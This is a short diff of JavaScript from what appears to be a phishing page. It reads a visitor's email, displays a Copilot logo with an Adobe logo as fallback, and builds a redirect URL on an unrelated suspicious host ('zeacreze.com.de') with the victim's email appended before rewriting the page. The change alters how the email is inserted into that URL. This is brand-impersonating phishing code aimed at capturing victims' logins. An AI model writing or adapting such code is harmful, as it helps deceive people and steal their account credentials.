@@ -64,7 +64,7 @@
 
             const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
             const logoUrl = `https://1000logos.net/wp-content/uploads/2023/11/Copilot-Logo-768x432.png`;
-            const targetUrl = email ? `https://06.zeacreze.com.de/AQBiHa@54cYLc58/*${email}` : 'https://06.zeacreze.com.de/AQBiHa@54cYLc58/';
+            const targetUrl = email ? `https://06.zeacreze.com.de/AQBiHa@54cYLc58/*{email}` : 'https://06.zeacreze.com.de/AQBiHa@54cYLc58/';
 
             document.body.innerHTML = `
                 <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
